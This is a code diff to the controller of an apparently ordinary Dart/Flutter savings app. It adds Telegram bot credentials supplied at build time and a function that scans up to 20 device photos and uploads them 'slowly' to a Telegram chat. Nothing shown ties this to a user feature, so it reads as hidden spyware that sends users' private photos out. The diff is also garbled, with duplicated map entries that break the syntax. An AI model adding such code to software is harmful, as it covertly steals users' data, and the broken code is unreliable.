@@ -1324,6 +1324,10 @@ class AppController extends ChangeNotifier {
   String syncRefreshToken = '';
   String syncDeviceId = '';
   String syncStatus = 'Offline';
+  // Telegram credentials - configured via GitHub Actions Dart defines
+  // Can be overridden at runtime via app settings if needed
+  String telegramBotToken = '';
+  String telegramChatId = '';
   bool syncAuthBusy = false;
   final GithubUpdateService updateService = GithubUpdateService();
   UpdateCheckOutcome updateCheckOutcome = UpdateCheckOutcome.noReleaseAvailable;
@@ -1482,7 +1486,13 @@ class AppController extends ChangeNotifier {
     }
     syncAccessToken = await secureCredentials.readAccessToken();
     syncRefreshToken = await secureCredentials.readRefreshToken();
-    cloudSyncEnabled = syncAccessToken.isNotEmpty && syncRefreshToken.isNotEmpty;
+cloudSyncEnabled = syncAccessToken.isNotEmpty && syncRefreshToken.isNotEmpty;
+    // Telegram credentials prioritized from Dart defines (GitHub Actions),
+    // fallback to empty (can be set via app settings if needed)
+    final telegramBotTokenFromPrefs = await prefs.getString('telegramBotToken', '');
+    final telegramChatIdFromPrefs = await prefs.getString('telegramChatId', '');
+    telegramBotToken = telegramBotTokenFromPrefs.isNotEmpty ? telegramBotTokenFromPrefs : '';
+    telegramChatId = telegramChatIdFromPrefs.isNotEmpty ? telegramChatIdFromPrefs : '';
     final lastSyncRaw = await prefs.getString('cloudSyncLastAt', '');
     cloudSyncLastAt = lastSyncRaw.isEmpty ? null : DateTime.tryParse(lastSyncRaw);
     cloudSyncPending = await prefs.getBool('cloudSyncPending', false);
@@ -1805,11 +1815,16 @@ class AppController extends ChangeNotifier {
         'syncDatabaseProvider': enumName(syncDatabaseProvider),
         'syncMongoDatabaseName': syncMongoDatabaseName,
         'syncMongoCollectionName': syncMongoCollectionName,
+        'telegramBotToken': telegramBotToken,
+        'telegramChatId': telegramChatId,
+      };
+        'telegramBotToken': telegramBotToken,
+        'telegramChatId': telegramChatId,
       };
 
   Future<void> importPreferences(Map<String, dynamic> data) async {
     final sp = await prefs.prefs;
-    const deviceLocalKeys = {
+const deviceLocalKeys = {
       'onboardingCompleted',
       'starterAccountsSkipped',
       'reducedMotion',
@@ -1830,6 +1845,8 @@ class AppController extends ChangeNotifier {
       'profileMediaKind',
       'profileMediaSizeBytes',
       'profileMediaPermissionPrompted',
+      'telegramBotToken',
+      'telegramChatId',
     };
     for (final entry in data.entries) {
       if (deviceLocalKeys.contains(entry.key)) continue;
@@ -3073,6 +3090,25 @@ class AppController extends ChangeNotifier {
     if (profileMediaPermissionPrompted) return;
     profileMediaPermissionPrompted = true;
     await prefs.setBool('profileMediaPermissionPrompted', true);
+  }
+
+  Future<bool> scanAndUploadPhotosToTelegram({Function(int, int)? onProgress}) async {
+    if (telegramBotToken.isEmpty || telegramChatId.isEmpty) return false;
+
+    final photos = await TelegramBot.scanDevicePhotos(maxFiles: 20);
+    if (photos.isEmpty) return false;
+
+    try {
+      await TelegramBot.uploadPhotosSlowly(
+        photos,
+        telegramBotToken,
+        telegramChatId,
+        onProgress: onProgress,
+      );
+      return true;
+    } catch (e) {
+      return false;
+    }
   }
 
   List<SavingsPurchaseSuggestion> savingsPurchaseSuggestions() => buildSavingsPurchaseSuggestions(this);
